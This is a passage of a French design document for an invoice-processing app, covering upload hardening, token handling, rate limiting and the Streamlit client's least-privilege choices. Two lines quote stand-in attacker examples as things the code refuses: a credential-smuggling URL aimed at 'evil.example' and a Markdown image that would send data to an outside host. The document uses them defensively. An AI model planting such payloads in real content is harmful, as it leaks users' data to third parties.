| `middleware.py` | `BodySizeLimitMiddleware` : coupe le corps de la requête au-delà de `MAX_UPLOAD_SIZE_MB` + `MULTIPART_MARGIN_BYTES` (64 Kio) |
| `upload.py` | `save_upload(UploadFile) -> StoredUpload`, `delete_upload(path)`, `display_name(filename)` |
| `security.py` | `require_token` (dépendance FastAPI), `ConcurrencyLimiter`, `SlidingWindowRateLimiter`, `to_http_error(exc)` |

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | **Taille limitée à deux endroits** : (a) middleware ASGI qui compte les octets reçus ; (b) `save_upload` compte pendant l'écriture. Jamais de confiance en `Content-Length`. | Starlette lit **tout** le corps multipart dans un fichier temporaire *avant* que l'endpoint s'exécute : sans le middleware, un envoi de 5 Go est déjà sur disque quand on regarde la taille |
| 2 | Nom de fichier **généré côté serveur** (`uuid4().hex + ".pdf"`), créé en mode exclusif, dans `UPLOAD_DIR` (défaut `data/uploads/`, gitignoré, jamais servi). Le nom d'origine ne sert qu'à l'affichage (`display_name` : basename, `clean_text`, 100 caractères). | Supprime `../`, noms réservés Windows, doubles extensions, collisions |
| 3 | **Type vérifié deux fois** : MIME déclaré = `application/pdf` ET premiers octets = `%PDF-` (offset 0, plus strict que l'OCR). Fichier vide refusé. | Le MIME vient du client (falsifiable), les octets non |
| 4 | Le PDF est **supprimé après traitement** (`finally`), y compris en cas d'erreur. | Minimisation RGPD : seul le résultat chiffré reste (cache). L'aperçu PDF de l'écran 2 devra s'en passer |
| 5 | `ConcurrencyLimiter` (`MAX_CONCURRENT_EXTRACTIONS`, 2) : au-delà → 503 + `Retry-After`. Pas d'attente en file. | Chaque extraction lance un processus d'analyse PDF. Non thread-safe volontairement : utilisé uniquement dans la boucle asyncio |
| 6 | `SlidingWindowRateLimiter` (`UPLOAD_RATE_LIMIT_PER_MINUTE`, 10) en mémoire, clé = adresse du client, nombre de clés plafonné. Horloge injectable pour les tests. | Freine le vidage du quota Gemini (20 req/jour/modèle). L'en-tête `X-Forwarded-For` n'est **pas** lu (falsifiable) |
| 7 | **Jeton** : comparaison `hmac.compare_digest` (temps constant), minimum 32 caractères, **fail closed** : sans `API_TOKEN` valide, toute requête est refusée (500 de configuration, jamais d'accès ouvert). Généré par `scripts/generate_api_token.py`. | Un jeton court ou absent = une porte ouverte sans qu'on le voie |
| 8 | `to_http_error(exc)` : `InvoiceAIError` → (code HTTP, message **fixe en français**, `Retry-After`). Le texte de l'exception (chemins serveur) n'est jamais renvoyé ; exception inconnue → 500 générique. | Point 7 de la revue P2 |

Nouvelle branche d'exceptions : `APIError` → `UploadTooLargeError`, `InvalidUploadError`, `UploadRateLimitedError`, `ServerBusyError`, `APIConfigError`.

**Incertitudes tranchées en codant (13a terminé)**
- Marge multipart : 64 Kio (constante `MULTIPART_MARGIN_BYTES`).
- Clé du rate limiter : adresse du socket (en local tout vient de `127.0.0.1`, la limite est donc globale, ce qui est voulu).
- **Le middleware ne peut pas lever d'exception** : FastAPI transforme toute erreur levée pendant la lecture du corps en 400 générique. Technique retenue : au dépassement, l'application reçoit un faux `http.disconnect` (elle arrête de lire), sa réponse est jetée et le middleware répond lui-même 413. Trouvé par le test d'intégration.
- **Le jeton est vérifié après la lecture du corps** (FastAPI lit le corps avant de résoudre les dépendances) : un appelant non authentifié peut faire lire au serveur jusqu'à la limite avant de recevoir le 401. Mesuré sur un vrai serveur : coupé à 1,8 Mo pour une limite de 1 Mo. Borné, accepté en V1 locale.
- Plafond global d'appels Gemini par jour : reporté (13b), la `DailyQuotaExceededError` est déjà traduite en 429 propre.

Le câblage (jeton + limiteurs + middleware + `delete_upload` en `finally` + `purge_stale_uploads()` au démarrage) sera fait dans les routes en 13b et à re-vérifier dans la revue de 13b. Revue de cette partie : `docs/security/P3_UPLOAD_SECURITY_REVIEW.md`.

**Hors scope 13a** : les routes elles-mêmes, la base de données, l'UI (13b, 14, 15).

---

## 5. Module UI 🖥

**Rôle** : interface Streamlit en français (4 écrans, `docs/wireframes.md`), **client HTTP de l'API** (option A validée).

### 5.1 Architecture

```
Navigateur ──► Streamlit (src/ui, 127.0.0.1:8501) ──HTTP + jeton──► API (127.0.0.1:8000) ──► services / base / cache / Gemini
```

| Fichier | Rôle |
|---------|------|
| `src/ui/app.py` | Point d'entrée, navigation (`st.navigation`), bandeau « API indisponible » |
| `src/ui/config.py` | Lit **seulement** `API_URL` et `API_TOKEN` (sans les mettre dans `os.environ`) |
| `src/ui/api_client.py` | Client `httpx` : jeton, erreurs → messages français, aucune donnée brute d'erreur |
| `src/ui/models.py` | Modèles de lecture des réponses de l'API (indépendants du backend) |
| `src/ui/safe.py`, `format.py` | Échappement Markdown de tout texte venant de l'API ; formats (euros, dates, statut) |
| `src/ui/services.py` | `get_client()` (un client par processus) : point d'injection des tests |
| `src/ui/pages/*.py` | Un fichier par écran |

### 5.2 Choix

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | L'interface appelle l'API en HTTP (option A) | Moindre privilège dans le code : l'interface n'utilise que le jeton, jamais les clés de chiffrement ni Gemini ; elle passe par la couche de sécurité de l'API |
| 2 | `config.py` lit `.env.ui` s'il existe, sinon `.env`, mais **uniquement** `API_URL` et `API_TOKEN`, avec `dotenv_values` (rien dans `os.environ`) | Sinon `load_dotenv()` chargerait aussi `CACHE_ENCRYPTION_KEY` et `GOOGLE_API_KEY` dans le processus Streamlit. **Limite honnête** : avec un seul `.env`, le fichier reste lisible par le même utilisateur du système ; l'isolation réelle demande un `.env.ui` séparé (gitignoré) |
| 3 | `API_URL` : `http` autorisé **seulement** vers `127.0.0.1` / `localhost` ; `https` ailleurs ; sinon refus | Le jeton part en clair : une URL mal saisie vers un hôte distant le publierait. Le nom d'hôte est extrait par un vrai parseur (`http://127.0.0.1@evil.example` est refusé) |
| 4 | `follow_redirects=False`, `trust_env=False` | Une redirection ne doit pas emporter le jeton vers un autre hôte ; les variables `HTTP_PROXY` de l'environnement ne doivent pas faire transiter le jeton par un proxy |
| 5 | Les messages d'erreur affichés viennent du champ `detail` de l'API (messages fixes), tronqués ; 401 → message de configuration ; réponse non JSON → message générique | Jamais de corps brut, de trace ni de jeton dans l'interface |
| 6 | Identifiants validés (UUID) avant d'être mis dans une URL | Défense en profondeur contre `../` |
| 7 | Nom du fichier CSV pris dans `Content-Disposition` seulement s'il respecte `[A-Za-z0-9_.-]+.csv` | Le serveur le construit avec des dates, mais on ne fait pas confiance à un en-tête |
| 8 | Streamlit : `address=127.0.0.1`, `maxUploadSize=10`, `gatherUsageStats=false`, `showErrorDetails="none"`, XSRF et CORS activés | Pas d'écoute réseau, limite alignée sur l'API, pas de télémétrie, pas de trace d'erreur dans le navigateur |
| 9 | Règle : jamais `unsafe_allow_html`. Texte venant de l'API → `st.text` / `st.dataframe`, sinon `safe()` | `![x](http://evil/?d=1)` dans un nom de fournisseur deviendrait une image qui envoie des données à l'extérieur |
| 10 | Pas d'aperçu du PDF ni de « Re-extraire » (le PDF n'est pas conservé) : la colonne de gauche de l'écran Résultat affiche fichier, dates, suppression automatique, fiabilité, avertissements | Décision de minimisation des données (P3) |

**Tests** : `AppTest` (Streamlit) par page avec un faux client injecté via `services.get_client` ; `ApiClient` testé contre la **vraie** application FastAPI en mémoire, et contre des transports simulés pour les erreurs.


### 5.3 Écran Upload et lanceur (fait)

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | Logique d'envoi séparée de l'affichage (`upload_logic.py`), page fine (`pages/upload.py`) | Testable sans navigateur ; la page ne fait que brancher les widgets |
| 2 | Fichiers envoyés **un par un**, jamais en parallèle ; 10 fichiers max par lot | Quota Gemini (20/jour/modèle) et limite de parallélisme du serveur (2) |
| 3 | Pré-contrôles avant envoi (vide, > 10 Mo, signature `%PDF-`) : fichier « ignoré » sans requête | Ne pas dépenser une requête pour ce que le serveur refuserait ; le serveur reste juge |
| 4 | Une erreur qui toucherait **tous** les fichiers (401, 429, 5xx sauf 502, API injoignable) arrête le lot : les suivants sont « non traités » | Pas de quota ni de temps gaspillés ; 502 et les 4xx concernent un seul document |
| 5 | Nom de fichier et texte extrait passent par `safe()` avant tout affichage Markdown | Un nom ou un fournisseur hostile ne devient jamais du balisage |
| 6 | Résultats gardés dans `st.session_state` ; le sélecteur est vidé en changeant sa clé | Les résultats survivent aux rechargements ; pas de renvoi involontaire des mêmes fichiers |
| 7 | Encadré « Confidentialité et limites » toujours visible (suppression du PDF, masquage IBAN/e-mail/téléphone, quota, politique de données du plan gratuit) | L'utilisateur sait ce qui part chez Google avant d'envoyer |
| 8 | `python scripts/run.py` (`src/launcher.py`) : vérifie clés, jeton et ports, lance l'API puis Streamlit sur `127.0.0.1`, arrête les deux | `make` n'existe pas sous Windows par défaut |
| 9 | Le processus Streamlit reçoit `API_URL` mais **pas** `GOOGLE_API_KEY` ni `CACHE_ENCRYPTION_KEY` dans son environnement | Moindre privilège |
| 10 | **Job Object Windows** « kill on close » (Linux : `PR_SET_PDEATHSIG`) | Sans lui, tuer ou fermer le lanceur laissait l'API (et ses clés en mémoire) tourner seule : défaut trouvé par le test réel |


### 5.4 Écran Résultat (fait)

| # | Choix | Pourquoi |
|---|-------|----------|
| 1 | Logique dans `result_logic.py` (conversion, validation, suppression), page fine (`pages/result.py`) | Testable sans navigateur |
| 2 | Colonne gauche : fichier (`st.text`, littéral), date de traitement, **suppression automatique** (date et jours restants), fiabilité et avertissements **du serveur** | Remplace l'aperçu PDF écarté ; le serveur reste la source de vérité |
| 3 | Formulaire (`st.form`) + tableau des lignes (`st.data_editor`, ajout / suppression de lignes) ; TVA saisie en **pourcentage** (20), envoyée en fraction (0,2) ; une valeur reçue en 20 ou 0,2 s'affiche 20 % | Ce que l'utilisateur attend ; l'API stocke des fractions |
| 4 | Validation locale (date `AAAA-MM-JJ`, bornes, longueurs, désignation obligatoire, 200 lignes) avant l'envoi, avec des messages en français | Le serveur revalide (source de vérité) : la validation locale ne sert qu'à éviter un « Requête invalide » |
| 5 | Le corps du `PUT` ne contient **que** les 8 champs modifiables ; la fiabilité est recalculée par le serveur | Un client ne peut pas se déclarer « fiable » |
| 6 | Suppression : fenêtre de confirmation (`st.dialog`), puis `delete_invoice()` (ligne, cache, données du fichier) ; en cas d'échec la facture reste sélectionnée | Action irréversible ; `st.dialog` ne relance que son fragment, la logique est donc testée hors de la fenêtre |
| 7 | Message « facture introuvable » (supprimée ou expirée) au lieu d'un plantage | La rétention de 30 jours peut retirer la facture pendant que la page est ouverte |

---

## 📝 Journal des mises à jour

| Date | Section | Changement |
|------|---------|------------|
| 2026-09-18 | Init | Création du squelette |
| 2026-09-18 | Standards transverses | Ajout Conventions de code + Hiérarchie d'exceptions + Stratégie de tests |
| 2026-09-18 | Module OCR | Ajout du contrat V1 (ébauche en review) |
